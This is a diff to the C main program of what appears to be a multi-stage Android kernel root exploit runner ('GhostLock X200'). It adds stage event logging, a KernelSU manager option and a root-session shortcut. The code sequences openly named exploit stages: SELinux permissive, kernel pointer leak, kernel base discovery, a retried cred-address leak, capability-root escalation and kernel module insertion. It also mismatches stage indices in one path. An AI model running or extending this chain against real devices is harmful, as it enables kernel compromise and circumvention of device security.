@@ -229,10 +229,24 @@ static int ksym_path_is_proc(const char *p) {
 
 static void usage(const char *a0) {
     fprintf(stderr,
-        "usage: %s <work> <tag> [--self-test [kallsyms_file]]\n"
+        "usage: %s <work> <tag> [bindir [--manager package]] | --self-test [kallsyms_file]\n"
         "  work: payload 目录（glt_esync/w2host/ksud 等资产）\n"
         "  tag : 本次运行标识（用于 socket/日志命名）\n",
         a0);
+}
+
+static void begin_stage(const RunnerCfg *cfg, int index) {
+    char event[32];
+    snprintf(event, sizeof(event), "stage-%d/start", index);
+    runner_event(cfg, event, 0);
+    LOG("UI_STAGE START %d", index);
+}
+
+static int finish_stage(const RunnerCfg *cfg, int index, int result) {
+    char event[32];
+    snprintf(event, sizeof(event), "stage-%d/end", index);
+    runner_event(cfg, event, result);
+    return result;
 }
 
 int main(int argc, char **argv) {
@@ -261,6 +275,18 @@ int main(int argc, char **argv) {
      * 缺省回退到 work（与旧调用兼容）。 */
     if (argc >= 4) cfg.bindir = argv[3];
 
+    if (argc > 4) {
+        if (argc != 6 || strcmp(argv[4], "--manager") != 0 ||
+            (strcmp(argv[5], "me.weishu.kernelsu") != 0 &&
+             strcmp(argv[5], "com.sukisu.ultra") != 0 &&
+             strcmp(argv[5], "com.resukisu.resukisu") != 0)) {
+            usage(argv[0]);
+            return 2;
+        }
+        cfg.manager_package = argv[5];
+        LOG("MANAGER selected: %s", cfg.manager_package);
+    }
+
     LOG("=== GhostLock X200 runner tag=%s work=%s ===", cfg.tag, cfg.work);
     LOG("device: %s", DEV_KERNEL_RELEASE);
 
@@ -269,16 +295,29 @@ int main(int argc, char **argv) {
     LOG("SELinux: %s", en == 1 ? "Permissive" : en == 0 ? "Enforcing" : "unknown");
     LOG("seccomp: %d (%s)", process_has_seccomp(),
         process_has_seccomp() ? "zygote app 过滤器" : "无过滤器");
-    if (stage0_gate(&cfg) != 0) return 1;
+    begin_stage(&cfg, 0);
+    if (finish_stage(&cfg, 0, stage0_gate(&cfg)) != 0) return 1;
 
-    if (stage1_permissive(&cfg) != 0) return 1;
-    if (stage2_kptr(&cfg) != 0) return 1;
+    if (getuid() == 0 && geteuid() == 0) {
+        LOG("ROOT_SESSION: runner uid=0; skip temporary-root exploit stages");
+        begin_stage(&cfg, 7);
+        if (finish_stage(&cfg, 8, stage_root_session(&cfg)) != 0) return 1;
+        LOG("=== ALL STAGES PASS ===");
+        return 0;
+    }
+
+    begin_stage(&cfg, 1);
+    if (finish_stage(&cfg, 1, stage1_permissive(&cfg)) != 0) return 1;
+    begin_stage(&cfg, 2);
+    if (finish_stage(&cfg, 2, stage2_kptr(&cfg)) != 0) return 1;
 
     SymTab ksym;
     memset(&ksym, 0, sizeof(ksym));
-    if (stage3_base(&cfg, &ksym) != 0) { symtab_free(&ksym); return 1; }
+    begin_stage(&cfg, 3);
+    if (finish_stage(&cfg, 3, stage3_base(&cfg, &ksym)) != 0) { symtab_free(&ksym); return 1; }
 
-    if (stage4_quiesce(&cfg) != 0) { symtab_free(&ksym); return 1; }
+    begin_stage(&cfg, 4);
+    if (finish_stage(&cfg, 4, stage4_quiesce(&cfg)) != 0) { symtab_free(&ksym); return 1; }
 
     char cands[16][64];
     memset(cands, 0, sizeof(cands));
@@ -290,8 +329,18 @@ int main(int argc, char **argv) {
      * 0xffffff822696f480（概率性）。PC 版注释：「手动 4 次全成功证明链路
      * 本身稳定，失败是 cred 候选质量问题」。多轮重试直到采样稳定。 */
     int leak_ok = 0;
+    begin_stage(&cfg, 5);
     for (int rr = 0; rr < 10 && !leak_ok; rr++) {
-        if (stage4_leak(&cfg, (char *)cands, sizeof(cands)) != 0) {
+        int result = stage4_leak(&cfg, (char *)cands, sizeof(cands));
+        char event[48];
+        snprintf(event, sizeof(event), "stage-5/round-%d", rr + 1);
+        runner_event(&cfg, event, result);
+        if (result == RUNNER_CLEANUP_FAILED) {
+            LOG("PROCESS_CLEANUP FAIL: worker still active; further rounds cancelled");
+            symtab_free(&ksym);
+            return 1;
+        }
+        if (result != 0) {
             LOG("STAGE4/5 ROUND %d: leak FAIL, retry", rr + 1);
             continue;
         }
@@ -303,18 +352,22 @@ int main(int argc, char **argv) {
         return 1;
     }
 
-    if (stage5_capsroot(&cfg, &ksym, (const char *)cands) != 0) {
+    finish_stage(&cfg, 5, 0);
+    begin_stage(&cfg, 6);
+    if (finish_stage(&cfg, 6, stage5_capsroot(&cfg, &ksym, (const char *)cands)) != 0) {
         symtab_free(&ksym);
         return 1;
     }
 
-    if (stage6_insmod(&cfg, &ksym) != 0) {
+    begin_stage(&cfg, 7);
+    if (finish_stage(&cfg, 7, stage6_insmod(&cfg, &ksym)) != 0) {
         symtab_free(&ksym);
         return 1;
     }
     symtab_free(&ksym);
 
-    if (stage7_verify(&cfg) != 0) return 1;
+    begin_stage(&cfg, 8);
+    if (finish_stage(&cfg, 8, stage7_verify(&cfg)) != 0) return 1;
 
     LOG("=== ALL STAGES PASS ===");
     return 0;
